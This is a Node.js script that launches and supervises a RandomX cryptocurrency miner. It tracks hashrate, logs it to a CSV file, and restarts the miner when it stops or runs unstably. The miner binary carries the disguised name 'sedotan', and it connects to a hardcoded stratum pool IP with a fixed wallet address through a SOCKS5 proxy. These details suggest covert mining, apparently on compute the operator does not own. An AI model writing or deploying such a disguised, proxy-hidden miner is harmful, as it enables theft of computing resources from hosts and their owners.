const { spawn } = require("child_process");
const fs = require("fs");

const WINDOW = 12;
const CHECK_INTERVAL = 60_000;
const MAX_FLUCT = 0.12;
const RESTART_DELAY = 15_000;
const LOG_FILE = "hashrate.csv";

let miner = null;
let speeds = [];
let restarting = false;
let startTime = Date.now();
let acceptedShares = 0;

/* ---------- util ---------- */
function normalize(v, unit) {
  if (unit === "kH") return v * 1e3;
  if (unit === "MH") return v * 1e6;
  return v;
}

function logCSV(avg, min, max, fluct, status) {
  const line = `${new Date().toISOString()},${avg.toFixed(2)},${min.toFixed(2)},${max.toFixed(2)},${(fluct*100).toFixed(2)},${status}\n`;
  fs.appendFileSync(LOG_FILE, line);
}

/* ---------- miner ---------- */
function startMiner() {
  console.log("▶ START MINER");

  restarting = false;
  speeds = [];
  acceptedShares = 0;
  startTime = Date.now();

  miner = spawn("./sedotan", [
    "--socks5=p.webshare.io:80",
    "--socks5_username=",
    "--socks5_password=",
    "./susu",
    "-a", "rx/0",
    "-o", "stratum+tcp://51.178.76.133:3339",
    "-u", "RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.sate",
    "--cpu-affinity=0xE",
    "-t4",
    "--cpu-memory-pool=N",
    "--cpu-no-yield",
    "--randomx-1gb-pages",
    "--no-color"
]);

  miner.stdout.on("data", d => {
    const text = d.toString();
    const lines = text.split(/\r?\n/);

    for (let line of lines) {
      if (!line.trim()) continue;

      // tampilkan raw log
      console.log("[RAW] " + line);

      // accepted share
      if (/accepted\s*\(\d+\/\d+\)/i.test(line)) {
        acceptedShares++;
      }

      // ambil speed (paling akurat)
      let m = line.match(/speed\s+10s\/60s\/15m\s+([\d.]+)\s+(?:n\/a|\d+)\s+(?:n\/a|\d+)\s*(H|kH|MH)\/s/i);

      // fallback: 729.3 H/s
      if (!m) {
        m = line.match(/([\d.]+)\s*(H|kH|MH)\/s/i);
      }

      if (!m) continue;

      const speed = normalize(parseFloat(m[1]), m[2]);
      speeds.push(speed);
      if (speeds.length > WINDOW) speeds.shift();
    }
  });

  miner.stderr.on("data", d => {
    console.error("[RAW-ERR] " + d.toString());
  });

  miner.on("exit", code => {
    console.log(`✖ EXIT (${code})`);
    scheduleRestart();
  });
}

/* ---------- restart ---------- */
function scheduleRestart() {
  if (restarting) return;
  restarting = true;
  console.log(`⟳ RESTART in ${RESTART_DELAY / 1000}s`);
  setTimeout(startMiner, RESTART_DELAY);
}

/* ---------- HEARTBEAT ---------- */
setInterval(() => {
  const uptimeSec = Math.floor((Date.now() - startTime) / 1000);
  const mm = String(Math.floor(uptimeSec / 60)).padStart(2, "0");
  const ss = String(uptimeSec % 60).padStart(2, "0");

  let state = "INIT";
  if (speeds.length > 0) state = "CONNECTING";
  if (acceptedShares > 0) state = "MINING";

  console.log(
    `⏳ HEARTBEAT | uptime=${mm}:${ss} state=${state} samples=${speeds.length}/${WINDOW} accepted=${acceptedShares}`
  );
}, 30_000);

/* ---------- stability check ---------- */
setInterval(() => {
  if (speeds.length < WINDOW / 2) return;

  const avg = speeds.reduce((a,b)=>a+b,0) / speeds.length;
  const max = Math.max(...speeds);
  const min = Math.min(...speeds);
  const fluct = (max - min) / avg;

  const stable = fluct <= MAX_FLUCT;
  const status = stable ? "STABLE" : "UNSTABLE";

  console.log(
    `[HASH] avg=${avg.toFixed(1)} H/s min=${min.toFixed(1)} max=${max.toFixed(1)} fluct=${(fluct*100).toFixed(1)}% → ${status}`
  );

  logCSV(avg, min, max, fluct, status);

  if (!stable) {
    console.log("⚠ HASHRATE UNSTABLE → restarting miner");
    miner.kill("SIGTERM");
  }
}, CHECK_INTERVAL);

/* ---------- init ---------- */
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, "time,avg_Hs,min_Hs,max_Hs,fluct_percent,status\n");
}

startMiner();
